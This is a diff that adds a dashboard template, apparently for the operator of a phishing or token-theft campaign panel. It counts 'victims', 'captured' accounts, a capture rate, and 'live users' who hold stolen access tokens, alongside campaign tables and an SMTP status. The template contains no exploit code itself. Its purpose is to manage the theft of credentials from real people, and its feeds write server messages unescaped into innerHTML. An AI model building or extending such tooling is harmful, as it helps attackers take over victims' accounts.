@@ -1,0 +1,401 @@
+{% extends "base.html" %}
+{% block title %}Dashboard{% endblock %}
+{% block page_title %}Dashboard{% endblock %}
+{% block extra_head %}
+<script>
+// Animated counter
+function animateCounter(el, target, duration = 1000) {
+    let start = 0;
+    const step = target / (duration / 16);
+    const timer = setInterval(() => {
+        start += step;
+        if (start >= target) {
+            start = target;
+            clearInterval(timer);
+        }
+        el.textContent = Math.floor(start);
+    }, 16);
+}
+
+// Fetch stats live
+function fetchStats() {
+    fetch('/api/stats')
+        .then(r => r.json())
+        .then(data => {
+            const capturedEl = document.getElementById('stat-captured');
+            const pendingEl = document.getElementById('stat-pending');
+            if (capturedEl) capturedEl.textContent = data.captured;
+            if (pendingEl) pendingEl.textContent = data.total - data.captured;
+            const rateEl = document.getElementById('stat-rate');
+            if (rateEl) {
+                const rate = data.total > 0 ? ((data.captured / data.total) * 100).toFixed(1) : 0;
+                rateEl.textContent = rate + '%';
+            }
+        })
+        .catch(() => {});
+}
+
+// Pagination (demo)
+function changePage(page) {
+    alert('Navigate to page ' + page + ' (pagination demo)');
+}
+
+// Export placeholder
+function exportTable() {
+    alert('CSV export will be implemented soon.');
+}
+
+// Filter campaigns
+function filterCampaigns() {
+    const query = document.getElementById('campaignSearch').value.toLowerCase();
+    const status = document.getElementById('campaignStatusFilter').value;
+    const rows = document.querySelectorAll('.campaign-row');
+    rows.forEach(row => {
+        const name = row.cells[0].textContent.toLowerCase();
+        const rowStatus = row.getAttribute('data-status');
+        let show = true;
+        if (query && !name.includes(query)) show = false;
+        if (status !== 'all' && rowStatus !== status) show = false;
+        row.style.display = show ? '' : 'none';
+    });
+}
+
+// Sort table
+function sortTable(n, tableId) {
+    const table = document.getElementById(tableId);
+    if (!table) return;
+    const rows = table.rows;
+    const dir = table.getAttribute('data-sort-dir') || 'asc';
+    const newDir = dir === 'asc' ? 'desc' : 'asc';
+    table.setAttribute('data-sort-dir', newDir);
+    const sorted = Array.from(rows).slice(1).sort((a, b) => {
+        const aVal = a.cells[n].textContent.trim();
+        const bVal = b.cells[n].textContent.trim();
+        if (!isNaN(aVal) && !isNaN(bVal)) {
+            return newDir === 'asc' ? aVal - bVal : bVal - aVal;
+        }
+        return newDir === 'asc' ? aVal.localeCompare(bVal) : bVal.localeCompare(aVal);
+    });
+    for (let i = 0; i < sorted.length; i++) {
+        table.appendChild(sorted[i]);
+    }
+}
+
+// Fetch activities and notifications for dashboard cards
+function fetchActivities() {
+    fetch('/api/activities')
+        .then(r => r.json())
+        .then(data => {
+            const container = document.getElementById('activityFeed');
+            if (!container) return;
+            if (data.length === 0) {
+                container.innerHTML = '<div class="activity-item">No recent activity.</div>';
+                return;
+            }
+            container.innerHTML = data.slice(0, 5).map(a => `
+                <div class="activity-item">
+                    <strong>${a.event_type.replace(/_/g, ' ').toUpperCase()}</strong>
+                    <span>${a.message}</span>
+                    <span class="time">${a.created_at ? new Date(a.created_at).toLocaleString() : ''}</span>
+                </div>
+            `).join('');
+        })
+        .catch(() => {});
+}
+
+function fetchNotifications() {
+    fetch('/api/notifications')
+        .then(r => r.json())
+        .then(data => {
+            const container = document.getElementById('notificationFeed');
+            if (!container) return;
+            if (data.length === 0) {
+                container.innerHTML = '<div class="activity-item">No notifications.</div>';
+                return;
+            }
+            container.innerHTML = data.slice(0, 5).map(a => `
+                <div class="activity-item">
+                    <span class="badge ${a.event_type === 'victim_captured' ? 'badge-success' : 'badge-info'}">${a.event_type.replace(/_/g, ' ').toUpperCase()}</span>
+                    <span>${a.message}</span>
+                    <span class="time">${a.created_at ? new Date(a.created_at).toLocaleString() : ''}</span>
+                </div>
+            `).join('');
+            const count = data.length;
+            const badge = document.getElementById('notifCount');
+            if (badge) badge.textContent = count > 0 ? count : '0';
+        })
+        .catch(() => {});
+}
+
+document.addEventListener('DOMContentLoaded', function() {
+    const total = parseInt(document.getElementById('stat-victims').textContent) || 0;
+    const captured = parseInt(document.getElementById('stat-captured').textContent) || 0;
+    animateCounter(document.getElementById('stat-victims'), total);
+    animateCounter(document.getElementById('stat-captured'), captured);
+    animateCounter(document.getElementById('stat-pending'), total - captured);
+    const rateEl = document.getElementById('stat-rate');
+    if (rateEl) {
+        const rate = total > 0 ? ((captured / total) * 100).toFixed(1) : 0;
+        rateEl.textContent = rate + '%';
+    }
+    setInterval(fetchStats, 5000);
+    fetchActivities();
+    fetchNotifications();
+    setInterval(fetchActivities, 15000);
+    setInterval(fetchNotifications, 15000);
+});
+</script>
+{% endblock %}
+
+{% block content %}
+<!-- KPI Cards -->
+<div class="stats-grid">
+    <div class="glass stat-card blue animate-slide">
+        <div class="number">{{ campaigns|length }}</div>
+        <div class="label"><i class="fas fa-bullhorn"></i> Total Campaigns</div>
+    </div>
+    <div class="glass stat-card green animate-slide" style="animation-delay: 0.1s;">
+        <div class="number" id="stat-victims">{{ victims|length }}</div>
+        <div class="label"><i class="fas fa-users"></i> Total Victims</div>
+    </div>
+    <div class="glass stat-card orange animate-slide" style="animation-delay: 0.2s;">
+        <div class="number" id="stat-captured">{{ captured_count or 0 }}</div>
+        <div class="label"><i class="fas fa-check-circle"></i> Captured</div>
+    </div>
+    <div class="glass stat-card red animate-slide" style="animation-delay: 0.3s;">
+        <div class="number" id="stat-pending">{{ (victims|length) - (captured_count or 0) }}</div>
+        <div class="label"><i class="fas fa-hourglass-half"></i> Pending</div>
+    </div>
+    <div class="glass stat-card" style="border-left-color: var(--info); animation-delay: 0.4s;">
+        <div class="number">{{ campaigns|selectattr('status', 'equalto', 'active')|list|length }}</div>
+        <div class="label"><i class="fas fa-play"></i> Active</div>
+    </div>
+    <div class="glass stat-card" style="border-left-color: var(--primary); animation-delay: 0.5s;">
+        <div class="number">{{ victims|selectattr('access_token', 'defined')|list|length }}</div>
+        <div class="label"><i class="fas fa-user-check"></i> Live Users</div>
+    </div>
+    <div class="glass stat-card" style="border-left-color: var(--success); animation-delay: 0.6s;">
+        <div class="number" id="stat-rate">0%</div>
+        <div class="label"><i class="fas fa-percent"></i> Capture Rate</div>
+    </div>
+</div>
+
+<!-- Charts Row 2x2 -->
+<div style="display: grid; grid-template-columns: 1fr 1fr; gap: 24px; margin-bottom: 24px;">
+    <div class="glass">
+        <h3 style="font-weight: 600; margin-bottom: 12px;">📈 Campaign Trend</h3>
+        <div class="chart-container" style="height: 200px;">
+            <canvas id="campaignChart"></canvas>
+        </div>
+    </div>
+    <div class="glass">
+        <h3 style="font-weight: 600; margin-bottom: 12px;">📊 Daily Activity</h3>
+        <div class="chart-container" style="height: 200px;">
+            <canvas id="activityChart"></canvas>
+        </div>
+    </div>
+    <div class="glass">
+        <h3 style="font-weight: 600; margin-bottom: 12px;">🎯 Campaign Performance</h3>
+        <div class="chart-container" style="height: 200px;">
+            <canvas id="performanceChart"></canvas>
+        </div>
+    </div>
+    <div class="glass">
+        <h3 style="font-weight: 600; margin-bottom: 12px;">🔄 Conversion Rate</h3>
+        <div class="chart-container" style="height: 200px;">
+            <canvas id="conversionChart"></canvas>
+        </div>
+    </div>
+</div>
+
+<!-- Recent Campaigns & Activity + Notifications Row -->
+<div style="display: grid; grid-template-columns: 2fr 1fr; gap: 24px; margin-bottom: 24px;">
+    <div class="glass">
+        <div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; margin-bottom: 16px;">
+            <h2 style="font-weight: 600;">📋 Recent Campaigns</h2>
+            <div style="display: flex; gap: 8px; flex-wrap: wrap;">
+                <input type="text" id="campaignSearch" placeholder="Search..." onkeyup="filterCampaigns()" style="width: 140px; padding: 6px 12px;">
+                <select id="campaignStatusFilter" onchange="filterCampaigns()" style="padding: 6px 12px;">
+                    <option value="all">All</option>
+                    <option value="active">Active</option>
+                    <option value="completed">Completed</option>
+                </select>
+                <button class="btn btn-sm btn-outline" onclick="exportTable()"><i class="fas fa-file-export"></i></button>
+            </div>
+        </div>
+        <div class="table-wrap">
+            <table id="campaignTable">
+                <tr>
+                    <th onclick="sortTable(0, 'campaignTable')">Name</th>
+                    <th onclick="sortTable(1, 'campaignTable')">Created</th>
+                    <th onclick="sortTable(2, 'campaignTable')">Victims</th>
+                    <th onclick="sortTable(3, 'campaignTable')">Captured</th>
+                    <th>Rate</th>
+                    <th>Status</th>
+                    <th>Actions</th>
+                </tr>
+                {% for c in campaigns %}
+                <tr class="campaign-row" data-status="{{ c.status }}">
+                    <td><strong>{{ c.name }}</strong></td>
+                    <td>{{ c.created_at[:16] }}</td>
+                    <td>{{ c.victim_count or 0 }}</td>
+                    <td>{{ c.captured_count or 0 }}</td>
+                    <td>{% if c.victim_count > 0 %}{{ (c.captured_count / c.victim_count * 100) | round(1) }}%{% else %}0%{% endif %}</td>
+                    <td><span class="badge {% if c.status == 'active' %}badge-success{% else %}badge-info{% endif %}">{{ c.status }}</span></td>
+                    <td><a href="/campaign/{{ c.id }}/detail" class="btn btn-sm btn-outline"><i class="fas fa-eye"></i></a></td>
+                </tr>
+                {% endfor %}
+            </table>
+        </div>
+        <div class="pagination">
+            <button disabled><i class="fas fa-chevron-left"></i></button>
+            <button class="active">1</button>
+            <button onclick="changePage(2)">2</button>
+            <button onclick="changePage(3)">3</button>
+            <button onclick="changePage(2)"><i class="fas fa-chevron-right"></i></button>
+        </div>
+    </div>
+
+    <div style="display: flex; flex-direction: column; gap: 24px;">
+        <div class="glass">
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px;">
+                <h3 style="font-weight: 600;"><i class="fas fa-clock"></i> Recent Activity</h3>
+                <a href="/audit" class="btn btn-sm btn-outline">View All</a>
+            </div>
+            <div id="activityFeed">
+                <div class="activity-item">Loading...</div>
+            </div>
+        </div>
+        <div class="glass">
+            <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px;">
+                <h3 style="font-weight: 600;"><i class="fas fa-bell"></i> Notifications</h3>
+                <span class="badge badge-info" id="notifCount">0</span>
+            </div>
+            <div id="notificationFeed">
+                <div class="activity-item">Loading...</div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- System Status -->
+<div class="glass">
+    <h2 style="font-weight: 600; margin-bottom: 16px;">⚡ System Status</h2>
+    <div class="status-grid">
+        <div class="status-item"><span class="dot green"></span> <span class="label">Database</span> <span class="value">Online</span></div>
+        <div class="status-item"><span class="dot green"></span> <span class="label">Queue</span> <span class="value">Online</span></div>
+        <div class="status-item"><span class="dot green"></span> <span class="label">API</span> <span class="value">Online</span></div>
+        <div class="status-item"><span class="dot green"></span> <span class="label">SMTP</span> <span class="value">Configured</span></div>
+        <div class="status-item"><span class="dot green"></span> <span class="label">Workers</span> <span class="value">Running</span></div>
+    </div>
+</div>
+
+<script>
+// Campaign Trend – Real data from API
+fetch('/api/campaign_trend')
+    .then(response => response.json())
+    .then(data => {
+        const ctx = document.getElementById('campaignChart').getContext('2d');
+        new Chart(ctx, {
+            type: 'line',
+            data: {
+                labels: data.labels,
+                datasets: [{
+                    label: 'Captured',
+                    data: data.data,
+                    borderColor: '#4361ee',
+                    backgroundColor: 'rgba(67,97,238,0.1)',
+                    tension: 0.3,
+                    fill: true,
+                }]
+            },
+            options: {
+                responsive: true,
+                maintainAspectRatio: false,
+                plugins: { legend: { display: false } },
+                scales: {
+                    y: { beginAtZero: true, grid: { color: 'var(--border)' } },
+                    x: { grid: { display: false } }
+                }
+            }
+        });
+    })
+    .catch(error => console.error('Error loading campaign trend:', error));
+
+// Daily Activity – Real data from API
+fetch('/api/activity_daily')
+    .then(response => response.json())
+    .then(data => {
+        const ctx = document.getElementById('activityChart').getContext('2d');
+        new Chart(ctx, {
+            type: 'bar',
+            data: {
+                labels: data.labels,
+                datasets: [{
+                    label: 'Activities',
+                    data: data.data,
+                    backgroundColor: 'rgba(76, 201, 240, 0.6)',
+                    borderColor: '#4cc9f0',
+                    borderWidth: 1,
+                    borderRadius: 4,
+                }]
+            },
+            options: {
+                responsive: true,
+                maintainAspectRatio: false,
+                plugins: { legend: { display: false } },
+                scales: {
+                    y: { beginAtZero: true, grid: { color: 'var(--border)' } },
+                    x: { grid: { display: false } }
+                }
+            }
+        });
+    })
+    .catch(error => console.error('Error loading activity chart:', error));
+
+// Campaign Performance (Pie) – real data from campaigns
+const activeCount = {{ campaigns|selectattr('status', 'equalto', 'active')|list|length }};
+const completedCount = {{ campaigns|selectattr('status', 'equalto', 'completed')|list|length }};
+const ctx3 = document.getElementById('performanceChart').getContext('2d');
+new Chart(ctx3, {
+    type: 'pie',
+    data: {
+        labels: ['Active', 'Completed'],
+        datasets: [{
+            data: [activeCount, completedCount],
+            backgroundColor: ['#4361ee', '#2ecc71'],
+            borderWidth: 0,
+        }]
+    },
+    options: {
+        responsive: true,
+        maintainAspectRatio: false,
+        plugins: {
+            legend: { position: 'bottom', labels: { boxWidth: 12, padding: 12 } }
+        }
+    }
+});
+
+// Conversion Rate (Doughnut)
+const ctx4 = document.getElementById('conversionChart').getContext('2d');
+new Chart(ctx4, {
+    type: 'doughnut',
+    data: {
+        labels: ['Captured', 'Pending'],
+        datasets: [{
+            data: [{{ captured_count or 0 }}, {{ (victims|length) - (captured_count or 0) }}],
+            backgroundColor: ['#4361ee', 'var(--border)'],
+            borderWidth: 0,
+        }]
+    },
+    options: {
+        responsive: true,
+        maintainAspectRatio: false,
+        plugins: {
+            legend: { position: 'bottom', labels: { boxWidth: 12, padding: 12 } }
+        },
+        cutout: '70%'
+    }
+});
+</script>
+{% endblock %}
